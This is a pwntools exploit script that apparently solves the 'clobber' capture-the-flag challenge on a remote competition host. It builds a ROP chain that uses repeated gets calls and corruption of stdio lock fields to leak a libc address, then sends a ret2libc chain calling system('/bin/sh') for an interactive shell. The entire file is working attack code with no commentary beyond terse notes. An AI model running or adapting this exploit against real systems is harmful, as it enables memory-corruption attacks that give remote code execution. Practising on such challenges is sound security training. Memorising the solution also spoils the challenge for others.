#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './clobber_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'clobber.umbccd.net', 13373

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    # set sysroot /proc/{pid}/root
    # b *gets
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================

def exploit():
    global io
    io = initialize()
    offset = 0x20
    with log.progress("Leak libc via ret2gets"), context.silent:
        rop = ROP(elf)
        rop.gets()
        rop.gets()
        rop.gets()
        rop.puts()
        rop.raw(rop.ret.address)
        rop.main()
        payload = flat({offset:[0, rop.chain()]})
        io.sendline(payload)    
        sleep(1)
        io.sendline(b"\x01") # _IO_stdfile_1_lock to 1 to point _IO_stdfile_0_lock 
        sleep(1)
        io.sendline(p32(0) + b"A"*4 + b"B"*8) #set lock to 0
        sleep(1)
        io.sendline(b"CCCC")
        io.recvuntil(b"CCCC")
        io.recv(4)
        libc_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
        libc.address = libc_leak + 0x28c0
    log.info(f"Libc leak: %#x", libc_leak)
    log.info(f"Libc base: %#x", libc.address)
    with log.progress("Get shell via ret2libc system"), context.silent:
        rop = ROP(libc)
        rop.raw(rop.ret.address)
        rop.system(next(libc.search(b"/bin/sh\x00")))
        payload = flat({offset:[0, rop.chain()]})
        sleep(1)
        io.sendline(payload)    
    io.interactive()

if __name__ == '__main__':
    exploit()
